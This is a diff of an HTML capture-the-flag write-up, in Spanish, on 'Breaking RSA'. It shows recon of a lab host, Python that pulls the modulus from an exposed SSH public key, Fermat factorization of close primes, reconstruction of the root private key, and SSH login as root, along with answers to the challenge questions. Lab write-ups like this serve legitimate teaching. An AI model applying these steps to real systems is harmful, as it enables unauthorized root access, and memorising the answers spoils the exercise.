@@ -51,7 +51,6 @@
     z-index: 1;
   }
 
-  /* HERO */
   .hero {
     padding: 60px 0 48px;
     border-bottom: 1px solid var(--border);
@@ -103,7 +102,6 @@
 
   .hero-meta span::before { content: '// '; color: var(--accent); opacity: 0.5; }
 
-  /* Kill chain */
   .killchain {
     background: var(--surface);
     border: 1px solid var(--border);
@@ -143,7 +141,6 @@
 
   .chain-arrow { color: var(--text-muted); font-size: 16px; }
 
-  /* Sections */
   .section {
     margin-bottom: 52px;
     animation: fadeUp 0.5s ease both;
@@ -182,7 +179,6 @@
 
   p { margin-bottom: 14px; font-size: 0.97rem; }
 
-  /* Code blocks */
   .code-block {
     background: #080d16;
     border: 1px solid var(--border);
@@ -240,7 +236,6 @@
     color: var(--accent);
   }
 
-  /* Tables */
   .table-wrap { overflow-x: auto; margin: 16px 0; }
 
   table {
@@ -275,7 +270,6 @@
   td.sev-high     { color: #fb923c; font-weight: 600; }
   td.sev-medium   { color: #fbbf24; font-weight: 600; }
 
-  /* Alert boxes */
   .alert {
     padding: 16px 20px;
     border-radius: 4px;
@@ -291,7 +285,6 @@
   .alert-success { background: rgba(0,255,157,0.06); border: 1px solid rgba(0,255,157,0.2); color: var(--accent3); }
   .alert-icon    { font-size: 1.1rem; flex-shrink: 0; margin-top: 1px; }
 
-  /* Flag cards */
   .flag-card {
     background: var(--surface);
     border: 1px solid var(--border);
@@ -305,7 +298,6 @@
   .flag-path  { font-family: var(--mono); font-size: 12px; color: var(--accent); margin-bottom: 8px; }
   .flag-value { font-family: var(--mono); font-size: 15px; color: var(--accent3); font-weight: 700; word-break: break-all; }
 
-  /* RSA visual */
   .rsa-box {
     background: var(--surface);
     border: 1px solid var(--border);
@@ -326,17 +318,11 @@
 
   .rsa-row:last-child { border-bottom: none; }
 
-  .rsa-var {
-    color: var(--accent);
-    font-weight: 700;
-    min-width: 40px;
-  }
-
-  .rsa-eq { color: var(--text-muted); }
+  .rsa-var { color: var(--accent); font-weight: 700; min-width: 40px; }
+  .rsa-eq  { color: var(--text-muted); }
   .rsa-val { color: var(--text); word-break: break-all; }
   .rsa-note { color: var(--text-muted); font-size: 11px; margin-left: auto; white-space: nowrap; }
 
-  /* Back link */
   .back-link {
     display: inline-flex;
     align-items: center;
@@ -405,7 +391,10 @@
       <span class="badge badge-linux">Linux</span>
       <span class="badge badge-crypto">Cryptography</span>
     </div>
-    <h1>🔐 Breaking <span class="accent">RSA</span></h1>
+    <h1>
+      <img src="img/Breaking%20RSA.png" alt="Breaking RSA" style="height:1.2em; vertical-align:middle; margin-right:8px;" />
+      Breaking <span class="accent">RSA</span>
+    </h1>
     <div class="hero-meta">
       <span>IP Objetivo: 10.65.129.183</span>
       <span>OS: Ubuntu 20.04</span>
@@ -440,13 +429,11 @@
   <!-- RECONOCIMIENTO -->
   <div class="section">
     <h2><span class="num">01</span> Reconocimiento</h2>
-
     <h3>// Nmap</h3>
     <div class="code-block">
       <div class="code-header">bash — nmap scan</div>
       <pre><span class="cmd">nmap</span> -sC -sV -T4 -oN nmap_breakingrsa.txt 10.65.129.183</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">output</div>
       <pre>PORT   STATE SERVICE VERSION
@@ -454,7 +441,6 @@
 <span class="ok">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span>
 |_http-title: Jack Of All Trades</pre>
     </div>
-
     <div class="table-wrap">
       <table>
         <thead><tr><th>Puerto</th><th>Servicio</th><th>Versión</th></tr></thead>
@@ -464,12 +450,10 @@
         </tbody>
       </table>
     </div>
-
     <div class="alert alert-info">
       <span class="alert-icon">📌</span>
       <div><strong>Respuesta pregunta 1:</strong> <code>2</code> servicios corriendo.</div>
     </div>
-
     <h3>// Inspección web</h3>
     <div class="code-block">
       <div class="code-header">bash</div>
@@ -486,7 +470,6 @@
   <!-- ENUMERACIÓN -->
   <div class="section">
     <h2><span class="num">02</span> Enumeración Web</h2>
-
     <h3>// Gobuster</h3>
     <div class="code-block">
       <div class="code-header">bash</div>
@@ -494,18 +477,15 @@
   -w /usr/share/wordlists/dirb/common.txt \
   -t 40 -o gobuster_breakingrsa.txt</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">output</div>
       <pre><span class="ok">/development  (Status: 301) [--> http://10.65.129.183/development/]</span>
 /index.html   (Status: 200) [Size: 384]</pre>
     </div>
-
     <div class="alert alert-info">
       <span class="alert-icon">📌</span>
       <div><strong>Respuesta pregunta 2:</strong> <code>development</code></div>
     </div>
-
     <h3>// Exploración de /development/</h3>
     <div class="code-block">
       <div class="code-header">bash</div>
@@ -517,12 +497,10 @@
 <span class="warn">id_rsa.pub</span>   13-Aug-2022 09:27   <span class="num">725</span> bytes   ← clave pública SSH
 <span class="warn">log.txt</span>      13-Aug-2022 09:27   <span class="num">321</span> bytes   ← archivo de registro</pre>
     </div>
-
     <div class="alert alert-warn">
       <span class="alert-icon">⚠️</span>
       <div>nginx tiene el <strong>listado de directorios habilitado</strong> — expone archivos sensibles públicamente.</div>
     </div>
-
     <h3>// Descarga y lectura de archivos</h3>
     <div class="code-block">
       <div class="code-header">bash</div>
@@ -539,7 +517,6 @@
 Also, <span class="flag-v">SSH root login is enabled.</span>
 https://github.com/murtaza-u/zet/tree/main/20220808171808</pre>
     </div>
-
     <div class="alert alert-warn">
       <span class="alert-icon">💥</span>
       <div>Dos vectores confirmados: <strong>p ≈ q</strong> (vulnerable a Fermat) + <strong>SSH root login habilitado</strong> (acceso directo si obtenemos la clave privada).</div>
@@ -549,9 +526,7 @@ https://github.com/murtaza-u/zet/tree/main/20220808171808</pre>
   <!-- ANÁLISIS CRIPTOGRÁFICO -->
   <div class="section">
     <h2><span class="num">03</span> Análisis Criptográfico — Extracción de n</h2>
-
     <p>Las claves públicas SSH en formato OpenSSH están codificadas en base64 con estructura TLV (Type-Length-Value). Se extraen <code>e</code> y <code>n</code> decodificando la clave:</p>
-
     <div class="code-block">
       <div class="code-header">python3 — extraer_n.py</div>
       <pre><span class="kw">import</span> base64, struct
@@ -573,14 +548,12 @@ print(<span class="str">f"e = {e}"</span>)
 print(<span class="str">f"bits de n = {n.bit_length()}"</span>)
 print(<span class="str">f"últimos 10 dígitos de n = {str(n)[-10:]}"</span>)</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">output</div>
       <pre>e = <span class="num">65537</span>
 bits de n = <span class="flag-v">4096</span>
 últimos 10 dígitos de n = <span class="flag-v">1225222383</span></pre>
     </div>
-
     <div class="rsa-box">
       <div class="rsa-row">
         <span class="rsa-var">e</span>
@@ -601,7 +574,6 @@ bits de n = <span class="flag-v">4096</span>
         <span class="rsa-note">clave privada</span>
       </div>
     </div>
-
     <div class="alert alert-info">
       <span class="alert-icon">📌</span>
       <div>
@@ -614,10 +586,8 @@ bits de n = <span class="flag-v">4096</span>
   <!-- FERMAT -->
   <div class="section">
     <h2><span class="num">04</span> Factorización con el Algoritmo de Fermat</h2>
-
     <h3>// Fundamento teórico</h3>
     <p>Si <code>p ≈ q</code>, entonces <code>n = p·q ≈ a²</code> donde <code>a = √n</code>. El algoritmo busca <code>a</code> tal que <code>a² - n = b²</code> (cuadrado perfecto), y entonces:</p>
-
     <div class="code-block">
       <div class="code-header">matemáticas</div>
       <pre>p = a + b
@@ -625,7 +595,6 @@ q = a - b
 <span class="comment"># Con primos muy cercanos, converge en pocas iteraciones</span>
 <span class="comment"># Un módulo de 4096 bits se factoriza en segundos</span></pre>
     </div>
-
     <h3>// Implementación</h3>
     <div class="code-block">
       <div class="code-header">python3 — factorizar.py</div>
@@ -647,7 +616,6 @@ print(<span class="str">f"q = {q}"</span>)
 print(<span class="str">f"Diferencia p - q = {p - q}"</span>)
 print(<span class="str">f"Verificación n = p*q: {p * q == n}"</span>)</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">output</div>
       <pre>p = <span class="ok">30989413979221186440875537962143588279...518123</span>
@@ -655,7 +623,6 @@ q = <span class="ok">30989413979221186440875537962143588279...516621</span>
 Diferencia p - q = <span class="flag-v">1502</span>
 Verificación n = p*q: <span class="ok">True</span></pre>
     </div>
-
     <div class="alert alert-success">
       <span class="alert-icon">✅</span>
       <div>
@@ -668,17 +635,14 @@ Verificación n = p*q: <span class="ok">True</span></pre>
   <!-- PRIVKEY + SSH -->
   <div class="section">
     <h2><span class="num">05</span> Generación de Clave Privada y Acceso SSH</h2>
-
     <h3>// Instalación de dependencias</h3>
     <div class="code-block">
       <div class="code-header">bash</div>
       <pre><span class="cmd">pip</span> install pycryptodome --break-system-packages
 <span class="comment"># Successfully installed pycryptodome-3.23.0</span></pre>
     </div>
-
     <h3>// Generación de la clave privada</h3>
     <p>Con <code>p</code>, <code>q</code> y <code>e = 65537</code> se calcula <code>d = modinv(e, φ(n))</code> y se exporta la clave en formato PEM:</p>
-
     <div class="code-block">
       <div class="code-header">python3 — generar_clave.py</div>
       <pre><span class="kw">from</span> Crypto.PublicKey <span class="kw">import</span> RSA
@@ -695,19 +659,16 @@ key = RSA.construct((n, e, d, p, q))
 
 print(<span class="str">"Clave privada generada: id_rsa_root ✅"</span>)</pre>
     </div>
-
     <div class="alert alert-info">
       <span class="alert-icon">📌</span>
       <div><strong>Respuesta pregunta 7:</strong> Clave privada generada exitosamente con <code>pycryptodome</code>.</div>
     </div>
-
     <h3>// Acceso SSH como root</h3>
     <div class="code-block">
       <div class="code-header">bash</div>
       <pre><span class="cmd">chmod</span> 600 id_rsa_root
 <span class="cmd">ssh</span> -i id_rsa_root root@10.65.129.183</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">output</div>
       <pre>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
@@ -715,7 +676,6 @@ print(<span class="str">"Clave privada generada: id_rsa_root ✅"</span>)</pre>
 <span class="flag-v">root@ip-10-65-129-183:~#</span>
 <span class="comment"># RSA de 4096 bits roto exitosamente</span></pre>
     </div>
-
     <div class="alert alert-success">
       <span class="alert-icon">🎉</span>
       <div>Acceso root obtenido directamente. Sin contraseña. Sin brute-force. Solo matemáticas.</div>
@@ -725,14 +685,12 @@ print(<span class="str">"Clave privada generada: id_rsa_root ✅"</span>)</pre>
   <!-- FLAG -->
   <div class="section">
     <h2><span class="num">06</span> Post-Explotación — Flag</h2>
-
     <div class="code-block">
       <div class="code-header">bash</div>
       <pre><span class="cmd">find</span> / -name <span class="str">"flag*"</span> 2>/dev/null | <span class="cmd">grep</span> -v sys | <span class="cmd">grep</span> -v proc
 <span class="comment"># /root/flag</span>
 <span class="cmd">cat</span> /root/flag</pre>
     </div>
-
     <div class="flag-card">
       <div class="flag-label">🚩 Flag</div>
       <div class="flag-path">/root/flag</div>
